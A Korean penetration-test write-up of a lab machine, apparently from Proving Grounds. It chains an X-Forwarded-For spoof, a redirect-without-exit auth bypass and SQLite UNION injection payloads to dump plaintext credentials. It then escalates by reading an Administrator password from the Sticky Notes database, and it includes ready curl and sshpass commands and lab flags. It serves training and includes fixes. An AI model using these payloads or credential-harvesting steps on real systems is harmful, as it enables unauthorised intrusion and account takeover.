---
tags:
  - type/machine
  - platform/pg
  - os/windows
  - status/solved
  - tech/web/access-control-bypass
  - tech/web/sqli
  - tech/db/sqlite
  - tech/cred/reuse
  - tech/win/sticky-notes
type: machine
platform: pg
os: windows
ip: 192.168.248.200
ports: [22, 80]
services: [http, ssh]
status: solved
manual_tags: true
manual_cves: true
tech_count: 5
---

> [!info] 요약
> 타겟 `192.168.248.200` · Windows 10 20H2(빌드 10.0.19042.1586) · Fundamental · 플래그 2개
> 진입점: `X-Forwarded-For: 10.10.10.1` 로 403 IP 게이트 우회 → `home.php` 검색 파라미터 SQLite UNION SQLi → `employees` 테이블 `Jeff:Mathsisfun123` 회수 → SSH user
> 권한상승: Sticky Notes DB(`plum.sqlite`)에 평문 저장된 `Administrator:MySupersecurePassword2112` → SSH root
> 시행착오·교훈 → [[_PLAYBOOK]]

## Target #1 – 192.168.248.200

### Initial Access – X-Forwarded-For 헤더 위조로 IP 화이트리스트를 우회하고 SQLite UNION SQLi 로 평문 자격증명 탈취

**Vulnerability Explanation:** 세 취약점이 체인됨.
- 앱이 클라이언트 IP 판단을 `$_SERVER['REMOTE_ADDR']` 대신 클라이언트가 임의로 지정 가능한 `X-Forwarded-For` 헤더로 함 — 프록시가 없는 직결 환경에서도 헤더 위조로 화이트리스트 우회
- 게이트 통과 후 도달하는 `home.php` 가 인증 리다이렉트(302)를 보낸 뒤에도 `exit`/`die` 없이 인증 뒤 화면을 전량 렌더 — 로그인 없이 본문을 그대로 읽는 인증 우회
- 그 `home.php` 의 직원 검색 파라미터(`first_name`/`last_name`)가 SQL 쿼리에 문자열 연결로 들어감 — SQLite UNION SQLi, in-band(결과가 화면 표에 직접 렌더)

**Vulnerability Fix:**
- 접근제어를 클라이언트 제어 헤더로 판단 금지. 실제 소켓 IP 나 프록시가 신뢰 서명한 값만 사용
- 검색 파라미터를 파라미터화 쿼리(prepared statement)로 바인딩. 문자열 연결 금지
- 자격증명을 앱 DB 에 평문 저장 금지 — bcrypt/argon2 해시로 저장해야 SQLi 로 덤프돼도 즉시 재사용 불가
- `home.php` 인증 리다이렉트 뒤 반드시 `exit` — 302 후에도 본문을 렌더하는 것 자체가 인증 우회

**Severity:** High — 인증 우회 후 SQLi 로 평문 자격증명 전량 탈취(아직 코드 실행은 아니나 즉시 계정 탈취로 이어짐)

**Steps to reproduce the attack:**
1. `X-Forwarded-For: 10.10.10.x` 헤더로 IP 화이트리스트 우회 → 로그인 폼 노출
2. 엔드포인트 배치 프로빙 → `home.php` 가 302 뒤에도 인증 뒤 화면을 전량 렌더
3. 검색 파라미터 `first_name` 에 `'` 주입 확인 → 컬럼 수 4개 · SQLite 엔진 확정
4. `sqlite_master` 로 스키마 열거 → `password` 컬럼을 가진 `employees` 테이블 확정
5. `UNION SELECT id,first_name,last_name,password FROM employees` 덤프 → `Jeff:Mathsisfun123`
6. 앱 로그인 폼은 거부 → OS(SSH) 계정으로 재사용해 로그인

### Service Enumeration

**Port Scan Results**

| IP Address | Ports Open |
|---|---|
| 192.168.248.200 | TCP: 22, 80 |

top-1000 은 2포트뿐. `-p-` 에서 7680/tcp 가 하나 더 잡혔으나 Windows Delivery Optimization(업데이트 P2P 배포)의 고정 포트라 공격면 아님. UDP top-100 은 전부 무응답.

```text
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH for_Windows_8.1 (protocol 2.0)
80/tcp open  http    PHP cli server 5.5 or later (PHP 7.3.33)
|_Requested resource was login.php
```
— 출처: `~/PG/Robust/nmap-quick.txt`

`OpenSSH for_Windows` 배너로 Windows 확정. 80 은 PHP 내장 서버(`php -S`)이지 Apache/IIS 아님 — `.htaccess`·모듈 기반 우회는 대상 밖.

`/` → 302 `login.php`. `login.php` 본문:

```text
Your IP is not allowed to use this webservice. Only 10.10.10.x is allowed
```

![[PG-Robust-403.png]]

IP 기반 화이트리스트. 실제 소켓 IP(192.168.45.x)는 못 바꾸므로 앱이 IP 를 어디서 읽는가가 관건 — 헤더를 신뢰하면 위조 가능.

### Initial Access – XFF 우회 → SQLite UNION SQLi

이 절차의 수동 SQLi 일반 판단 신호와 엔진 지문 치트시트는 [[_PLAYBOOK#B-12. SQLi 수동 UNION — sqlmap 금지 대비]]. 헤더 접근제어 우회의 후보 헤더 배치는 [[_PLAYBOOK#B-15. 헤더 기반 IP 접근제어 우회]].

모든 요청에 `-H "X-Forwarded-For: 10.10.10.1"` 필수. 파라미터는 `--data-urlencode` 로 인코딩(`'`·공백·`--` 보존).

후보 헤더 12종을 배치로 쏘고 응답 크기로 diff. 통한 것은 `X-Forwarded-For` 하나뿐.

```text
200 1770 X-Forwarded-For       ← 로그인 폼 노출 (게이트 통과)
200 90   X-Real-IP             ← "not allowed" (90B)
200 90   X-Originating-IP
200 90   X-Client-IP
200 90   Client-IP
200 90   X-Forwarded-Host
... (나머지 전부 90B "not allowed")
```
— 출처: `~/PG/Robust/xff/` (12개 응답 본문 전량 보존)

```bash
curl -s -H "X-Forwarded-For: 10.10.10.1" http://192.168.248.200/login.php
```

![[PG-Robust-login.png]]

게이트 통과 후 엔드포인트를 배치 프로빙. `home.php` 가 302 인데 본문 3030B — 나머지 302 는 본문 0B:

```text
302 3030  /home.php     ← 302 인데 본문 3030B (리다이렉트 후에도 페이지 전량 렌더)
302 0     /index.php
404 ...   기타
```
— 출처: `~/PG/Robust/probe2/`

`home.php` 는 `exit`/`die` 없이 인증 뒤 화면을 전량 출력. `curl -L` 로 리다이렉트를 따라가면 이 본문을 놓침.

`Manage Employees` 직원 검색 폼 + 목록.

![[PG-Robust-home.png]]

검색 폼: `?action=search&first_name=<입력>&last_name=<입력>` (GET).

주입점 확인 — `first_name=Desireef'` → 0행(쿼리 깨짐). `first_name=Desireef' -- ` → 1행 복귀. 작은따옴표 문자열 컨텍스트 확정.
— 출처: `~/PG/Robust/union/`

NULL 개수 1~6 과 `ORDER BY` 1/5/10 을 각각 한 배치로 쏨:

```text
' UNION SELECT NULL--                     → 0행
' UNION SELECT NULL,NULL--                → 0행
' UNION SELECT NULL,NULL,NULL--           → 0행
' UNION SELECT NULL,NULL,NULL,NULL--      → 정상 (표에 빈 행 추가)
' UNION SELECT NULL,NULL,NULL,NULL,NULL-- → 0행 (컬럼 불일치로 쿼리 실패)
' ORDER BY 1--                            → 정상
' ORDER BY 5--                            → 0행
' ORDER BY 10--                           → 0행
```
— 출처: `~/PG/Robust/union/c7~c15.body`

컬럼 4개 확정 — `ORDER BY 5` 실패 + `UNION SELECT` 4-NULL 성공, 두 방법이 일치. 판정은 응답 본문 크기로 함 — 오류 메시지가 안 뜨므로 「행이 렌더됐는가」가 유일한 신호. 실패 응답은 약 1.87KB(빈 표), 성공은 4.3KB.

첫 시도 `' UNION SELECT 1,version(),database(),user()-- ` → 0행. MySQL 함수가 통째로 실패. 엔진 판별 배치를 쏨:

```text
' UNION SELECT 1,2,3,4--                            → 정상 (11행: 원본10 + 주입1 `1 2 3 4`)
' UNION SELECT 1,sqlite_version(),3,4--             → 정상, 2번 자리에 `3.28.0` ← SQLite 확정
' UNION SELECT 1,@@version,3,4--                    → 0행 (MySQL/MSSQL 함수 실패)
' UNION SELECT 1,version(),3,4--                    → 0행
' UNION SELECT 1,name,sql,4 FROM sqlite_master--     → 정상 (스키마 노출)
' UNION SELECT 1,table_name,3,4 FROM information_schema.tables-- → 0행
```
— 출처: `~/PG/Robust/fp/`

`sqlite_version()` 만 통하고 값이 `3.28.0` → SQLite. `information_schema` 는 SQLite 에 아예 없으므로 앞서 던진 tables 쿼리가 빈 결과였던 것. 주입 행의 네 값(`1 2 3 4`)이 표의 `Id`·`First name`·`Last name`·`Birth date` 열에 그대로 하나씩 렌더됨 — 출력 가능한 자리는 4개 전부.

돌아온 테이블 7개 — `class_lists`·`employees`·`emps`·`qualifications`·`sqlite_sequence`·`staffing_plan`·`terms`. `sqlite_sequence` 가 목록에 있는 것 자체가 SQLite 확증(AUTOINCREMENT 내부 테이블). 화면에 보이던 직원 목록은 `emps`(생년월일·주소 등)이고, `password` 컬럼을 가진 것은 별개 테이블 `employees`:

```sql
CREATE TABLE "employees" ( "id" INTEGER, "first_name" TEXT, "last_name" TEXT, "password" TEXT, PRIMARY KEY("id" AUTOINCREMENT) )
```

이름이 비슷한 두 테이블을 헷갈리면 덤프 대상을 잘못 잡음. 나머지는 학사·인사 관리용 테이블이고 `sqlite_sequence` 는 SQLite 내부 테이블 — 덤프해 보지 않았음.

```bash
curl -s -H "X-Forwarded-For: 10.10.10.1" -G \
  --data-urlencode 'action=search' \
  --data-urlencode "first_name=' UNION SELECT id,first_name,last_name,password FROM employees-- " \
  --data-urlencode 'last_name=' \
  http://192.168.248.200/home.php
```

`password` 는 4번째 선택 컬럼이므로 표의 `Birth date` 열에 렌더됨:

```text
Id | First name | Last name | Birth date
1  | Jeff       | Hills     | Mathsisfun123
```
— 출처: `~/PG/Robust/union/creds.body`

![[PG-Robust-sqli.png]]

`employees` 테이블은 단 1행. 평문 비밀번호 `Mathsisfun123`.

앱 로그인 폼에 `Jeff/Mathsisfun123` 은 안 통함 — `Invalid user or password.` 가 뜸. 앱 로그인이 어느 저장소를 참조하는지는 관측 없음 — 확인된 것은 `employees.password` 값이 앱 폼에서 거부됐다는 것까지임. 그러나 OS 계정으로는 그대로 재사용됨(`~/PG/Robust/applogin.body`).

```bash
sshpass -p 'Mathsisfun123' ssh jeff@192.168.248.200
```

타겟 pty 프롬프트:

```text
Microsoft Windows [Version 10.0.19042.1586]
(c) Microsoft Corporation. All rights reserved.

jeff@ROBUST C:\Users\Jeff>whoami && hostname && type C:\Users\jeff\Desktop\local.txt
robust\jeff
ROBUST
c73e61a25344e60d7e3d9fab6711200a
```
— 출처: `~/PG/Robust/pty_jeff.txt`

**Local.txt value:**
`c73e61a25344e60d7e3d9fab6711200a`

### Privilege Escalation – Sticky Notes 평문 자격증명

**Vulnerability Explanation:** Windows Sticky Notes 앱이 노트 본문을 SQLite `Note` 테이블에 평문으로 저장. `jeff` 계정이 자신의 Sticky Notes DB(`AppData\Local\Packages` 하위, 계정별 격리)에서 `Administrator` 자격증명을 그대로 읽을 수 있는 위치에 남겨둠.

**Vulnerability Fix:**
- Sticky Notes 같은 사용자 앱에 비밀번호를 적어두지 말 것 — 자격증명 관리자(Credential Manager)나 별도 보안 저장소 사용
- 관리자 계정 비밀번호를 로컬 사용자와 공유·병기하지 말 것. 최소 권한 원칙상 `jeff` 가 도달 가능한 파일에 admin 자격증명이 존재해서는 안 됨

**Severity:** Critical — 로컬 저장 평문 자격증명으로 즉시 관리자(SYSTEM 급) 획득

**Steps to reproduce the attack:**
1. `harvest.ps1` 로 커널·서비스·토큰·SMB 경로 소거 — 전부 접근거부/공백으로 막힘
2. Sticky Notes 고정 경로(`AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite`)에서 파일 존재 확인
3. `scp` 로 본 DB 회수 → `sqlite3 'select * from Note;'` 로 평문 자격증명 `Administrator:MySupersecurePassword2112` 확보
4. SSH 로 Administrator 재사용 로그인

`harvest.ps1` 실행. `jeff` 계정은 권한이 낮아 상당수 항목이 접근거부. 출처는 `~/PG/Robust/harvest.txt` · `harvest-gap-check.txt`:

- `whoami /all` — 특권은 `SeShutdown`·`SeChangeNotify`·`SeUndock`·`SeIncreaseWorkingSet`·`SeTimeZone` 5개뿐. `SeImpersonatePrivilege` 없음 → Potato 계열 불가. Medium IL, 그룹은 `BUILTIN\Users` 외에 특권 없음
- `systeminfo` → `ERROR: Access denied` — hotfix 목록으로 커널 익스플로잇을 고르는 경로가 통째로 막힘
- `Get-CimInstance Win32_Service` → count 0 / `Get-ScheduledTask` → CIM 서버 접근거부. 서비스 바이너리 권한·언쿼티드 경로 점검이 전부 공란
- Winlogon AutoLogon·AlwaysInstallElevated → 빈 값 / `cmdkey /list` → `* NONE *` / PowerShell 히스토리 없음
- `icacls C:\Windows\System32\config\SAM` → `Access is denied` — SeriousSAM(CVE-2021-36934) 아님
- 로컬 admin 그룹 = `Administrator` 뿐. 계정은 `Administrator`·`Jeff`·`Guest`·`DefaultAccount`·`WDAGUtilityAccount`
- `netstat -ano` — 내부에는 135·139·445·5040·7680 과 동적 RPC(49664–49669)가 LISTEN. 이 중 외부 `-p-` 스캔에 잡힌 것은 7680 뿐이고 135·139·445 는 안 잡힘 — 호스트 방화벽이 SMB/RPC 를 막고 있음. 네트워크 쪽으로 더 팔 것이 없음

커널·서비스·토큰·SMB 경로가 전부 막힘. 남는 것은 파일에 남은 자격증명. 경로는 Sticky Notes 앱의 고정 위치:

```text
C:\Users\jeff\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite
```

디렉터리 열거 결과 `plum.sqlite`·`plum.sqlite-wal`·`plum.sqlite-shm` 세 파일이 존재(`~/PG/Robust/sticky-find.txt`). scp 로 본 DB 만 회수해 `sqlite3` 로 열람 — 본 DB 에서 바로 평문이 나와 `-wal`·`-shm` 은 받지 않음.

```bash
sqlite3 sticky/plum.sqlite 'select * from Note;'
```

`Note` 테이블 2행, 본문이 평문:

```text
\id=0d4b8d2c-8539-4fb4-8c8b-184552bf9b92 Credentials:
\id=a6c52b67-f266-45ff-9aaf-5ccbe22f7d45 Administrator:MySupersecurePassword2112|ManagedPosition=|0|0||Yellow|0|...
```
— 출처: `~/PG/Robust/sticky/plum.sqlite`

`-wal` 이 있으면 같이 받을 것 — WAL 모드에서는 최신 변경이 본 DB 에 체크포인트되기 전까지 `-wal` 에만 있어서, 본 DB 만 열면 최신 노트를 통째로 놓칠 수 있음. 이 박스는 본 DB 에 이미 있었을 뿐임(관측 없음: 이 박스에서 `-wal` 을 실제로 확인한 것은 아님).

```bash
sshpass -p 'MySupersecurePassword2112' ssh Administrator@192.168.248.200
```

타겟 pty:

```text
Microsoft Windows [Version 10.0.19042.1586]
(c) Microsoft Corporation. All rights reserved.

administrator@ROBUST C:\Users\Administrator>whoami && hostname && type C:\Users\Administrator\Desktop\proof.txt
robust\administrator
ROBUST
d2cdab936a61a5e7a0abd203cd8f4670
```
— 출처: `~/PG/Robust/pty_admin.txt`

### Post-Exploitation

**Proof.txt value:**
`d2cdab936a61a5e7a0abd203cd8f4670`

증거: `~/PG/Robust/proof_user.txt`·`proof_root.txt`(각각 `whoami /all`+`hostname`+`ipconfig`+`type` 한 화면). pty 프롬프트: `pty_jeff.txt`·`pty_admin.txt`.

**남긴 흔적**
- 타겟 업로드 `h.ps1`·`harvest.txt`·`rbchk.ps1` 전부 삭제 확인(`~/PG/Robust/cleanup.txt`)
- 계정 생성·설정 변경 없음. `plum.sqlite*` 는 읽기(scp)만
- Kali 리스너 없음(SSH 경로라 리버스셸 자체를 쓰지 않음 — 아웃바운드 포트 문제가 애초에 발생하지 않음). tmux 세션 전부 이름으로 종료. NFS 마운트 없음

## 관련

- SQLite `sqlite_master` 스키마 열거: <https://www.sqlite.org/schematab.html>
- PayloadsAllTheThings — HTTP header IP spoofing / SQLi UNION
- Sticky Notes `plum.sqlite` 포렌식: `%LOCALAPPDATA%\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\`
- [[_PLAYBOOK#B-15. 헤더 기반 IP 접근제어 우회]] · [[_PLAYBOOK#B-12. SQLi 수동 UNION — sqlmap 금지 대비]] · [[_PLAYBOOK#B-43. Windows Sticky Notes 는 자격증명 저장소다]]
- [[_PLAYBOOK#A-15. 302 여도 본문이 있다 / 블랙리스트가 302 를 오판한다]] · [[_PLAYBOOK#A-24. 한 서비스의 거부는 자격증명의 오류가 아니다]] · [[_PLAYBOOK#A-25. 그럴듯한 로그인 폼이 미끼일 수 있다]] · [[_PLAYBOOK#A-41. 셸은 잡았는데 권한상승 실마리가 없다]]
